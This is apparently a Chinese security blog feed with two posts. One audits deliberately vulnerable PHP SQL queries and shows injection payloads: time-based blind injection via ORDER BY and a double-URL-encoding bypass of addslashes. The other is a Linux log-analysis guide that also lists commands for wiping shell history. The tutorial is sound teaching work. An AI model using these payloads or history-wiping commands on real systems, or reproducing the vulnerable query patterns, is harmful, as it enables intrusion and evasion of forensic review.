class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>并没有将过滤后的语句传入sql，所以这个intval等于无用，直接注入。</p><p><img src="https://z3.ax1x.com/2021/10/18/5NfNE4.png"></p><h3 id="9-第八个SQL注入代码分析"><a href="#9-第八个SQL注入代码分析" class="headerlink" title="9 第八个SQL注入代码分析"></a>9 第八个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Status: 404 Not Found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where id = <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    echxo <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑错误的分析，is_numeric会检测，如果数字就可以执行，如果不是数字，就会弹404页面。但是解析器会继续向下运行，所以会导致SQL注入。</p><p><img src="https://z3.ax1x.com/2021/10/18/5N7VRH.png"></p><h3 id="10-第九个SQL注入代码分析"><a href="#10-第九个SQL注入代码分析" class="headerlink" title="10 第九个SQL注入代码分析"></a>10 第九个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Status: 404 Not found"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where id =  <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>       <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// stmt = PDOStatement  预处理状态</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">,</span><span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>if中加了exit，让解析器无法继续执行，所以这个无法注入</p><h3 id="11-第十个SQL注入代码分析"><a href="#11-第十个SQL注入代码分析" class="headerlink" title="11 第十个SQL注入代码分析"></a>11 第十个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details ORDER BY id <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$order</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们可以控制order导致sql盲注，因为这里没有报错信息，所以无法报错注入，利用 , 添加排序字段实现注入语句使用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">,</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>或者<span class="token keyword">and</span><span class="token punctuation">(</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>或者<span class="token keyword">and</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/18/5UnM2F.png"></p><h3 id="12-第十一个SQL注入代码分析"><a href="#12-第十一个SQL注入代码分析" class="headerlink" title="12 第十一个SQL注入代码分析"></a>12 第十一个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/DESC|ASC/i'</span><span class="token punctuation">,</span> <span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Bad order"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details ORDER BY id <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$order</span><span class="token punctuation">}</span></span>;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>过滤不完全，在asc/desc后利用,添加排序字段实现注入语句</p><pre class="line-numbers language-none"><code class="language-none">asc,if(1=1,sleep(1),0)修改代码使其无法注入!preg_match('/^(DESC|ASC)$/i', $order)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/18/5Ul7Ct.png"></p><h3 id="13-第十二个SQL注入代码分析"><a href="#13-第十二个SQL注入代码分析" class="headerlink" title="13 第十二个SQL注入代码分析"></a>13 第十二个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where name = ?;"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bindValue</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$email</span><span class="token punctuation">,</span> <span class="token variable">$country</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>标准的预编译代码，找不到注入点</p><h3 id="14-第十三个SQL注入代码分析"><a href="#14-第十三个SQL注入代码分析" class="headerlink" title="14 第十三个SQL注入代码分析"></a>14 第十三个SQL注入代码分析</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./conn.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">{</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT name, age, email, country FROM user_details where name = '<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span></span>';"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$query</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$email</span></span>"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"&lt;br&gt;"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>PDOException <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>加了urldecode反而可以绕过addslashes，从而绕过单引号</p><pre class="line-numbers language-none"><code class="language-none">' --&gt; %27   #单次url编码因为浏览器会自动解码一次' --&gt; %25%32%37   #双次url编码所以输入'的二次urlencode即可绕过<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/10/18/5aVurR.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="-- 代码审计" scheme="https://github.com/chenchanghui/chenchanghui.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Linux日志分析</title>
    <link href="https://github.com/chenchanghui/chenchanghui.github.io/posts/349f9b06.html"/>
    <id>https://github.com/chenchanghui/chenchanghui.github.io/posts/349f9b06.html</id>
    <published>2021-10-15T14:35:42.000Z</published>
    <updated>2021-10-21T02:46:03.012Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Linux系统拥有非常灵活和恶强大的日志功能，可以保存几乎所有操作记录，并可以从中检索出我们需要的信息。本文简介一下Linux系统日志及日志分析技巧。</p><p>0x01 日志简介</p><p>查看日志配置情况：more etcrsylog.conf</p><table><thead><tr><th>日志文件</th><th>说明</th></tr></thead><tbody><tr><td>/var/log/cron</td><td>记录了系统定时任务相关的日志</td></tr><tr><td>/var/log/cups</td><td>记录打印信息日志</td></tr><tr><td>/var/log/dmesg</td><td>记录了系统开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td></tr><tr><td>/var/log/mailog</td><td>记录邮件信息</td></tr><tr><td>/var/log/message</td><td>记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td></tr><tr><td>/var/log/btmp</td><td>记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td></tr><tr><td>/var/log/lastlog</td><td>记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td></tr><tr><td>/var/log/wtmp</td><td>永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令查看</td></tr><tr><td>/var/log/utmp</td><td>记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而需要w，who，users等命令来查询</td></tr><tr><td>/var/log/secure</td><td>记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td></tr></tbody></table><p>比较重要的几个日志：</p><p>登录失败记录：/var/log/btmp //lastb</p><p>最后一次登录：/var/log/lastlog //lastlog</p><p>登录成功记录：/var/log/wtmp //last</p><p>登录日志记录：/var/log/secure</p><p>目前登录用户信息：/var/run/utmp //w、who、users</p><p>历史命令记录：history</p><p>仅清理当前用户：history -c</p><h2 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h2><h3 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h3><p>Linux下常用的shell命令如：find、grep、egrep、awk、sed</p><p>1、grep显示前后几行信息：</p><pre class="line-numbers language-none"><code class="language-none">标准unix/linux下的grep通过下面参数控制上下文grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行grep -B 5 foo file 显示foo及前5行grep -A 5 foo file 显示foo及后5行查看grep版本号的方法是grep -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2、grep查找含有某字符串的所有文件</p><pre class="line-numbers language-none"><code class="language-none">grep -rn "hello,world!"*：表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、如何显示一个文件的某几行</p><pre class="line-numbers language-none"><code class="language-none">cat input_file | tail -n +1000 | head -n 2000#从第1000行开始，显示2000行。即显示1000~2999行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>4、find /etc -name init</p><pre class="line-numbers language-none"><code class="language-none">//在目录/etc中查找文件init<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>5、只是显示/etc/passwd的账户</p><pre class="line-numbers language-none"><code class="language-none">cat /etc/passwd |awk -F ':' '{print $1}'//awk -F指定域分隔符':'，将记录按指定的域分隔符划分域，填充域，$0则表示所有域，$1表示第一个域，$n表示第n个域。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>6、sed -i ‘153,$d’.bash_history</p><pre class="line-numbers language-none"><code class="language-none">删除历史操作记录，只保留前153行<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h3><p>1、/var/log/secure</p><pre class="line-numbers language-none"><code class="language-none">1、定位有多少ip在爆破主机的root账号：grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more定位有哪些ip在爆破：grep "Failed password" /var/log/secure | grep -E -o "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" | uniq -c爆破用户名字典是什么grep "failed password" /var/log/secure | perl -e 'while($_=&lt;&gt;){ /for(.*?) from/; print "$1\n";}' | uniq -c | sort -nr2、登录成功的ip有哪些:grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c |sort -nr | more登录成功的日期、用户名、ip：grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'3、增加一个用户kali日志：Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali #grep "useradd" /var/log/secure4、删除用户kali日志：Jul 10 00:14:17 localhost userdel[2393]: delete user 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed group 'kali' owned by 'kali' Jul 10 00:14:17 localhost userdel[2393]: removed shadow group 'kali' owned by 'kali' # grep "userdel" /var/log/secure5、su切换用户：Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)sudo授权执行: sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good 